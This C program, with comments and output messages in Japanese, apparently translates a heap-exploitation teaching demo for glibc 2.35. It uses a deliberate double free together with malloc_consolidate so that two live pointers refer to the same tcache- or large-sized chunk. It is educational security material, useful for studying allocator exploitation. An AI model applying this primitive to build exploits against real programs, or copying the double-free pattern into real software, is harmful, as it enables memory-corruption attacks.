#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8

この文書は主に、malloc_consolidate と、それをdouble free と組み合わせて、同じ large サイズのチャンクを指す
2 つのポインタを得る方法を示すためのものです。large サイズのチャンクは、PREV_INUSE チェックのため、通常は直接そうすることが困難です。
興味深いことに、これは特定のサイズの tcache サイズのチャンクにも当てはまります。

malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) は、基本的に
すべての fastbin のチャンクを隣接するチャンクと併合 (merge) し、unsorted bin に入れ、可能であれば top とも併合します。

glibc 2.35 の時点では、これは次の 5 か所からのみ呼び出されます。
1. _int_malloc: large サイズのチャンクが確保されるとき (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)
2. _int_malloc: チャンクに対応する bin が見つからず、top が小さすぎるとき (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)
3. _int_free: チャンクサイズが FASTBIN_CONSOLIDATION_THRESHOLD (65536) 以上のとき (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)
4. mtrim: 常に (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)
5. __libc_mallopt: 常に (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)

ここでは 1 番目の呼び出し箇所を狙うので、small bin に属さないチャンクを確保する必要があります
(このチェックの 'else' 分岐に入ろうとしているためです: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901)。
つまり、チャンクのサイズは 0x400 以上である必要があります(つまり large サイズです)。特に、
tcache サイズの最大のチャンクは 0x410 なので、チャンクが [0x400, 0x410] の範囲にあれば、
double freeを利用して tcache サイズのチャンクを制御できます。
*/

#define CHUNK_SIZE 0x400

int main() {
	printf("この技法は、malloc_consolidate とdouble free を利用して、tcache 内にチャンクの重複を作ります。\n");
	printf("fastbin を強制的に使わせるために、tcache を埋める準備をします...\n\n");

	void *ptr[7];

	for(int i = 0; i < 7; i++)
		ptr[i] = malloc(0x40);

	void* p1 = malloc(0x40);
	printf("同じサイズのチャンクをもう 1 つ確保します p1=%p \n", p1);

	printf("tcache を埋めます...\n");
	for(int i = 0; i < 7; i++)
		free(ptr[i]);

  	printf("ここで p1 を解放すると、fastbin に追加されます。\n\n");
  	free(p1);

	printf("malloc_consolidate を発動させるには、large のチャンクサイズ (0x400 以上) のチャンクを確保する必要があります。\n");
	printf("これは要求サイズ 0x3f0 以上に相当します。ここでは 0x400 バイトを要求します。すると、\n");
	printf("チャンクサイズ 0x410 の tcache サイズのチャンクが得られます ");
  	void* p2 = malloc(CHUNK_SIZE);

	printf("p2=%p.\n", p2);

	printf("\nまず、malloc_consolidate が fastbin のチャンク p1 を top と併合します。\n");
	printf("次に、p2 より大きい(または同じ大きさの)空きチャンクがないため、p2 は top から確保されます。したがって p1 = p2 です。\n");

	assert(p1 == p2);

  	printf("p1 をdouble freeします。p1 は、いま確保したばかりの 0x410 のチャンク (p2) を指しています。\n\n");
	free(p1); // 脆弱性 (double free)
	printf("これで、そのチャンクは tcache に入っています(最初に 0x410 より大きいチャンクサイズを選んでいた場合は、top と併合されます)。\n");

	printf("つまり p1 はdouble freeされており、p2 は解放されていないにもかかわらず、空きチャンクを指しています。\n");

	printf("0x400 バイトを要求します。すると、現在 tcache bin に入っている 0x410 のチャンクが得られます。\n");
	printf("p2 と p1 も、引き続きそのチャンクを指しています。\n");
	void *p3 = malloc(CHUNK_SIZE);

	assert(p3 == p2);

	printf("これで、直接は解放されていない 2 つのポインタ (p2 と p3) が得られました。\n");
	printf("どちらも同じ tcache サイズのチャンクを指しています。p2=%p p3=%p\n", p2, p3);
	printf("チャンクの重複に成功しました!\n\n");

	printf("注: この重複は、より大きなチャンクサイズでも成立します。その場合、チャンクは\n");
	printf("同じように振る舞い、tcache bin ではなく top から取られるだけです。\n");
	printf("large サイズのチャンクは、通常は重複させるのが難しいため、これはかなり便利です。\n");
	printf("large サイズのチャンクは、PREV_INUSE チェックのために、直接のdouble freeに耐性があるからです。\n");

	return 0;
}
